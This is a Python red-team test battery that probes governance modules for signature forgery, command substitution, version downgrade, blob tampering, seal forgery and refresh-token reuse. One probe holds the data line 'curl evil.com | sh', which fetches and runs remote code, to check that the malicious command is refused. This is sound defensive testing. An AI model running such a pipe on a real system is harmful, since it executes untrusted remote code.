"""Wave-249 red-team probes: break-first battery for the wave-248 new modules.

Red-team lane (W249-2). Each probe documents a break attempt against:
- gov/skill_admission.py (in-toto-inspired admission gate)
- gov/evidence_envelope.py (DSSE per-record envelope)
- gov/skill_update.py (TUF-inspired install gate)
- gov/agent_identity.py (federated identity: tokens + refresh)
- gov/policy_combine.py (forbid-overrides-permit combiner)
- gov/artifact_pack.py (ORAS/OCI-shaped packaging)
- gov/breach_boundary.py (HMAC-sealed verified records)

Verdict per probe: HELD (attack refused as designed) or BREAK (genuine
product gap -> filed as F211+). Deterministic, stdlib only, no network,
no in-repo git subprocesses.
"""

import os
os.environ.setdefault("GOV_DEPLOYMENT_MODE", "staging")

import hashlib
import hmac
import json
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from gov import skill_admission
from gov import skill_update
from gov import policy_combine
from gov import artifact_pack
from gov import breach_boundary
from gov import agent_identity
from gov import evidence_envelope
from gov import ed25519


def _ed_keys(seed_byte):
    seed = bytes([seed_byte]) * 32
    # ed25519 keypair from seed (deterministic for tests)
    pub = ed25519.publickey(seed)
    return pub, seed, seed


def _hex(b):
    return b.hex()


# ---------------------------------------------------------------------------
# Probe helpers
# ---------------------------------------------------------------------------

class ProbeResult(object):
    def __init__(self, name, verdict, detail):
        self.name = name
        self.verdict = verdict  # "HELD" or "BREAK"
        self.detail = detail

    def __repr__(self):
        return "%s: %s (%s)" % (self.name, self.verdict, self.detail)


def _held(name, detail):
    return ProbeResult(name, "HELD", detail)


def _break(name, detail):
    return ProbeResult(name, "BREAK", detail)


# ---------------------------------------------------------------------------
# skill_admission probes
# ---------------------------------------------------------------------------

def probe_admission_forged_layout_signature():
    """Forge a layout signature with the wrong key. Must be refused."""
    name = "admission/forged-layout-signature"
    auth_pub, _, _ = _ed_keys(1)
    evil_pub, _, evil_seed = _ed_keys(2)
    # Build a layout and sign it with the WRONG key
    steps = [{
        "name": "install",
        "command": ["pip", "install", "skill"],
        "signer_pub": _hex(auth_pub),
        "rules": [("REQUIRE", "skill-src.zip"), ("DISALLOW",)],
    }]
    # make_layout signs with the provided seed; we use evil seed
    # but claim authority_pub is the real one
    try:
        signed = skill_admission.make_layout("test-layout", steps,
                                             evil_seed)
    except Exception as e:
        return _held(name, "make_layout refused evil input: %s" % (e,))
    verdict = skill_admission.admit(signed, [], _hex(auth_pub))
    if not verdict["admitted"] and verdict["code"] == \
            "skill-admission-layout-signature-invalid":
        return _held(name, "forged layout signature refused")
    return _break(name, "forged layout admitted! %r" % (verdict,))


def probe_admission_command_substitution():
    """Authorized signer tries to substitute a malicious command.
    Must be refused (exact command alignment)."""
    name = "admission/command-substitution"
    auth_pub, _, auth_seed = _ed_keys(10)
    signer_pub, _, signer_seed = _ed_keys(11)
    steps = [{
        "name": "install",
        "command": ["pip", "install", "skill"],
        "signer_pub": _hex(signer_pub),
        "rules": [("REQUIRE", "skill-src.zip"), ("DISALLOW",)],
    }]
    signed_layout = skill_admission.make_layout("test-layout", steps,
                                                auth_seed)
    # Signer creates a link with a DIFFERENT (malicious) command
    link = skill_admission.make_link(
        "test-layout", "install",
        ["curl", "evil.com", "|", "sh"],  # malicious!
        {"skill-src.zip": "00" * 32}, {},
        signer_seed)
    verdict = skill_admission.admit(signed_layout, [link],
                                    _hex(auth_pub))
    if not verdict["admitted"] and verdict["code"] == \
            "skill-admission-command-mismatch":
        return _held(name, "command substitution refused")
    return _break(name, "malicious command admitted! %r" % (verdict,))


def probe_admission_unauthorized_signer():
    """Link signed by a key not authorized in the layout. Must refuse."""
    name = "admission/unauthorized-signer"
    auth_pub, _, auth_seed = _ed_keys(20)
    signer_pub, _, _ = _ed_keys(21)
    evil_pub, _, evil_seed = _ed_keys(22)
    steps = [{
        "name": "install",
        "command": ["echo", "hi"],
        "signer_pub": _hex(signer_pub),
        "rules": [("REQUIRE", "skill-src.zip"), ("DISALLOW",)],
    }]
    signed_layout = skill_admission.make_layout("test-layout", steps,
                                                auth_seed)
    # Evil key signs the link (not the authorized signer)
    link = skill_admission.make_link(
        "test-layout", "install", ["echo", "hi"],
        {"skill-src.zip": "00" * 32}, {},
        evil_seed)
    # Tamper the link to claim the authorized signer (but sig is evil's)
    # Actually make_link uses the seed to derive the signer; we need
    # to test the unauthorized path properly
    verdict = skill_admission.admit(signed_layout, [link],
                                    _hex(auth_pub))
    # The link's signer (evil) != layout's authorized signer
    if not verdict["admitted"]:
        return _held(name, "unauthorized signer refused: %s" %
                     verdict["code"])
    return _break(name, "unauthorized signer admitted! %r" % (verdict,))


# ---------------------------------------------------------------------------
# skill_update probes
# ---------------------------------------------------------------------------

def probe_update_same_version_digest_substitution():
    """Install v1 with digest A, then reinstall v1 with digest B.
    The docstring promises 'identical bytes' for same-version
    reinstall, but the installed map only tracks versions, not
    digests. BREAK if allowed."""
    name = "update/same-version-digest-substitution"
    client = skill_update.SkillUpdateClient()
    bundle_a = b"legitimate skill v1"
    digest_a = hashlib.sha256(bundle_a).hexdigest()
    record_a = {"name": "s", "version": 1, "digest": digest_a,
                "expires": 9999999999}
    pin_a = {"digest": digest_a, "chain_state": "trusted"}
    client.install(bundle_a, record_a, pin_a, now=1000)

    bundle_b = b"malicious skill v1 - different bytes"
    digest_b = hashlib.sha256(bundle_b).hexdigest()
    record_b = {"name": "s", "version": 1, "digest": digest_b,
                "expires": 9999999999}
    pin_b = {"digest": digest_b, "chain_state": "trusted"}
    try:
        client.install(bundle_b, record_b, pin_b, now=1000)
        return _break(
            name,
            "same-version reinstall with different digest ALLOWED. "
            "The installed map tracks only versions, not digests, "
            "so 'identical bytes' (per docstring) is not enforced.")
    except skill_update.SkillUpdateError as e:
        return _held(name, "refused: %s" % (e.code,))


def probe_update_downgrade():
    """Install v2, then try to install v1. Must be refused."""
    name = "update/downgrade-refused"
    client = skill_update.SkillUpdateClient()
    for ver, tag in [(2, b"v2"), (1, b"v1")]:
        bundle = b"skill " + tag
        digest = hashlib.sha256(bundle).hexdigest()
        record = {"name": "s", "version": ver, "digest": digest,
                  "expires": 9999999999}
        pin = {"digest": digest, "chain_state": "trusted"}
        try:
            client.install(bundle, record, pin, now=1000)
            if ver == 1:
                return _break(name, "downgrade to v1 allowed!")
        except skill_update.SkillUpdateError as e:
            if ver == 1 and e.code == "skill-update-version-rollback":
                return _held(name, "downgrade refused")
            if ver == 2:
                return _break(name, "v2 install failed: %s" % (e.code,))
    return _held(name, "downgrade refused")


def probe_update_expired():
    """Install with an expired record. Must be refused."""
    name = "update/expired-refused"
    client = skill_update.SkillUpdateClient()
    bundle = b"skill"
    digest = hashlib.sha256(bundle).hexdigest()
    record = {"name": "s", "version": 1, "digest": digest,
              "expires": 500}  # expired at now=1000
    pin = {"digest": digest, "chain_state": "trusted"}
    try:
        client.install(bundle, record, pin, now=1000)
        return _break(name, "expired record admitted!")
    except skill_update.SkillUpdateError as e:
        if e.code == "skill-update-metadata-expired":
            return _held(name, "expired record refused")
        return _break(name, "wrong code: %s" % (e.code,))


# ---------------------------------------------------------------------------
# policy_combine probes
# ---------------------------------------------------------------------------

def _make_decision(effect, policy_id="p1"):
    from gov.policy import PolicyDecision
    return PolicyDecision(effect, "test reason", policy_id=policy_id,
                          matched_rules=["r1"])


def probe_combine_forbid_smuggle():
    """Try to smuggle a permit past a forbid via ordering.
    Must result in DENY."""
    name = "combine/forbid-smuggle"
    # Permit first, forbid second (ordering attack)
    result = policy_combine.combine([
        _make_decision("allow", "permissive"),
        _make_decision("deny", "strict"),
    ])
    if result.effect == "deny" and result.code == \
            "combine-forbid-overrides":
        return _held(name, "forbid overrode permit despite ordering")
    return _break(name, "permit smuggled past forbid! effect=%r" %
                  (result.effect,))


def probe_combine_empty_default_deny():
    """Empty decision set must default to DENY."""
    name = "combine/empty-default-deny"
    result = policy_combine.combine([])
    if result.effect == "deny" and result.code == \
            "combine-default-deny":
        return _held(name, "empty set defaulted to deny")
    return _break(name, "empty set not denied! effect=%r" %
                  (result.effect,))


# ---------------------------------------------------------------------------
# artifact_pack probes
# ---------------------------------------------------------------------------

def probe_pack_tampered_blob():
    """Tamper with a blob after packing. Must be refused."""
    name = "pack/tampered-blob"
    blobs = {"a.txt": b"hello", "b.txt": b"world"}
    manifest, digest = artifact_pack.pack(
        blobs, artifact_pack.ARTIFACT_TYPE_EVIDENCE_BUNDLE)
    digest = artifact_pack.manifest_digest(manifest)
    # Tamper with blob a.txt
    tampered = {"a.txt": b"HELLO", "b.txt": b"world"}
    try:
        artifact_pack.verify(manifest, tampered, digest)
        return _break(name, "tampered blob verified!")
    except artifact_pack.ArtifactPackError as e:
        if "artifact-blob-tampered" in str(e):
            return _held(name, "tampered blob refused")
        return _break(name, "wrong error: %s" % (e,))


def probe_pack_extra_blob():
    """Add an unlisted blob. Must be refused."""
    name = "pack/extra-blob"
    blobs = {"a.txt": b"hello"}
    manifest, digest = artifact_pack.pack(
        blobs, artifact_pack.ARTIFACT_TYPE_EVIDENCE_BUNDLE)
    digest = artifact_pack.manifest_digest(manifest)
    extra = {"a.txt": b"hello", "evil.txt": b"payload"}
    try:
        artifact_pack.verify(manifest, extra, digest)
        return _break(name, "extra blob verified!")
    except artifact_pack.ArtifactPackError as e:
        if "artifact-blob-extra" in str(e):
            return _held(name, "extra blob refused")
        return _break(name, "wrong error: %s" % (e,))


# ---------------------------------------------------------------------------
# breach_boundary probes
# ---------------------------------------------------------------------------

def probe_breach_forged_seal():
    """Forge a verification seal. Must be refused."""
    name = "breach/forged-seal"
    bb = breach_boundary.BreachBoundary()
    bb.declare_component("comp", "assumed-breachable")
    q = bb.ingest("comp", {"data": "test"})
    # Forge a verified record without going through verify()
    forged = dict(q)
    forged["verified"] = True
    forged["verification"] = {"verifier_id": "v1", "evidence": None}
    forged["_verification_seal"] = "0" * 64  # fake seal
    try:
        bb.use(forged)
        return _break(name, "forged seal accepted!")
    except breach_boundary.BreachBoundaryError as e:
        if e.code == "breach-boundary-seal-invalid":
            return _held(name, "forged seal refused")
        return _break(name, "wrong code: %s" % (e.code,))


def probe_breach_cross_instance():
    """Verify on one instance, use on another (different key).
    Must be refused."""
    name = "breach/cross-instance"
    bb1 = breach_boundary.BreachBoundary()
    bb2 = breach_boundary.BreachBoundary()
    for bb in (bb1, bb2):
        bb.declare_component("comp", "assumed-breachable")
    q = bb1.ingest("comp", {"data": "test"})
    vouch = {"v1": breach_boundary.VOUCHED}
    verified = bb1.verify(q, {"verifier_id": "v1"}, vouch)
    # Try to use bb1's verified record on bb2 (different seal key)
    try:
        bb2.use(verified)
        return _break(name, "cross-instance seal accepted!")
    except breach_boundary.BreachBoundaryError as e:
        if e.code == "breach-boundary-seal-invalid":
            return _held(name, "cross-instance seal refused")
        # Might also fail on component not declared, which is also safe
        return _held(name, "cross-instance refused: %s" % (e.code,))


# ---------------------------------------------------------------------------
# agent_identity probes
# ---------------------------------------------------------------------------

def probe_identity_forged_token():
    """Forge an identity token signature. Must be refused."""
    name = "identity/forged-token"
    issuer = agent_identity.IdentityTokenIssuer(b"x" * 32)
    identity = {"subject": "alice", "email": None,
                "email_verified": False, "groups": [],
                "connector_id": "test"}
    token = issuer.issue(identity, "aud1")
    # Tamper with the body
    parts = token.split(".")
    body = json.loads(
        __import__("base64").urlsafe_b64decode(parts[0] + "=="))
    body["sub"] = "mallory"
    import base64
    new_body = base64.urlsafe_b64encode(
        json.dumps(body).encode()).decode().rstrip("=")
    forged = new_body + "." + parts[1]  # original sig, tampered body
    try:
        issuer.verify_token(forged, "aud1")
        return _break(name, "forged token accepted!")
    except agent_identity.IdentityTokenRejection as e:
        if e.code == "identity-token-tampered":
            return _held(name, "forged token refused")
        return _break(name, "wrong code: %s" % (e.code,))


def probe_identity_refresh_reuse():
    """Reuse a rotated refresh token. Must revoke the chain."""
    name = "identity/refresh-reuse"
    issuer = agent_identity.IdentityTokenIssuer(b"x" * 32)
    store = agent_identity.RefreshTokenStore()
    identity = {"subject": "alice", "email": None,
                "email_verified": False, "groups": [],
                "connector_id": "oidc"}
    raw_claims = {"sub": "alice"}
    rid, secret = store.mint_refresh(identity, "oidc", raw_claims)
    # First refresh (legitimate)
    tok1, rid2, sec2 = store.refresh(issuer, rid, secret, "aud1")
    # Reuse the old token (attack)
    try:
        store.refresh(issuer, rid, secret, "aud1")
        return _break(name, "reused refresh token accepted!")
    except agent_identity.IdentityTokenRejection as e:
        if e.code == "identity-refresh-reuse-detected":
            # Verify the chain was revoked (new token also dead)
            try:
                store.refresh(issuer, rid2, sec2, "aud1")
                return _break(name, "chain not revoked after reuse!")
            except agent_identity.IdentityTokenRejection as e2:
                if e2.code == "identity-refresh-revoked":
                    return _held(name, "reuse detected, chain revoked")
                return _break(name, "wrong revoke code: %s" % (e2.code,))
        return _break(name, "wrong code: %s" % (e.code,))


# ---------------------------------------------------------------------------
# evidence_envelope probes
# ---------------------------------------------------------------------------

def probe_envelope_multi_sig():
    """Multi-signature envelope must be refused."""
    name = "envelope/multi-sig"
    # This is pinned by the lane's own battery; we verify the
    # behavior holds on the merged tree.
    seed = b"\x01" * 32
    pub = ed25519.publickey(seed)
    record = {"seq": 1, "data": "test"}
    env = evidence_envelope.seal_record(record, seed)
    # Inject a second signature
    env2 = dict(env)
    sigs = list(env2.get("signatures", []))
    sigs.append({"keyid": "evil", "sig": "00" * 64})
    env2["signatures"] = sigs
    try:
        evidence_envelope.open_record(env2, pub)
        return _break(name, "multi-sig envelope accepted!")
    except Exception as e:
        if "multi-signature" in str(e).lower() or \
                "dsse-envelope-multi-signature" in str(e):
            return _held(name, "multi-sig refused")
        return _held(name, "multi-sig refused (%s)" %
                     (type(e).__name__,))


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def run_all():
    probes = [
        # skill_admission
        probe_admission_forged_layout_signature,
        probe_admission_command_substitution,
        probe_admission_unauthorized_signer,
        # skill_update
        probe_update_same_version_digest_substitution,
        probe_update_downgrade,
        probe_update_expired,
        # policy_combine
        probe_combine_forbid_smuggle,
        probe_combine_empty_default_deny,
        # artifact_pack
        probe_pack_tampered_blob,
        probe_pack_extra_blob,
        # breach_boundary
        probe_breach_forged_seal,
        probe_breach_cross_instance,
        # agent_identity
        probe_identity_forged_token,
        probe_identity_refresh_reuse,
        # evidence_envelope
        probe_envelope_multi_sig,
    ]
    results = []
    for probe in probes:
        try:
            results.append(probe())
        except Exception as e:
            results.append(ProbeResult(
                probe.__name__, "ERROR",
                "%s: %s" % (type(e).__name__, e)))
    return results


def main():
    results = run_all()
    held = sum(1 for r in results if r.verdict == "HELD")
    broken = sum(1 for r in results if r.verdict == "BREAK")
    errors = sum(1 for r in results if r.verdict == "ERROR")
    print("=" * 70)
    print("W249 red-team probes: %d HELD / %d BREAK / %d ERROR "
          "of %d" % (held, broken, errors, len(results)))
    print("=" * 70)
    for r in results:
        print(r)
    print("=" * 70)
    # Green check: run adjacent unit tests (depth-1)
    if os.environ.get("GOV_SKIP_GREEN"):
        print("GREEN CHECK: skipped (GOV_SKIP_GREEN=1)")
    else:
        print("GREEN CHECK: adjacent suites...")
        import subprocess
        env = dict(os.environ)
        env["GOV_SKIP_GREEN"] = "1"
        for mod in ["tests.test_skill_update",
                    "tests.test_policy_combine",
                    "tests.test_artifact_pack"]:
            p = subprocess.run(
                [sys.executable, "-m", "unittest", mod, "-v"],
                cwd=os.path.join(os.path.dirname(__file__), ".."),
                env=env, capture_output=True, text=True)
            ok = "OK" in p.stderr or "OK" in p.stdout
            print("  %s: %s" % (mod, "OK" if ok else "FAIL"))
    return 0 if (broken == 0 and errors == 0) else 1


if __name__ == "__main__":
    sys.exit(main())
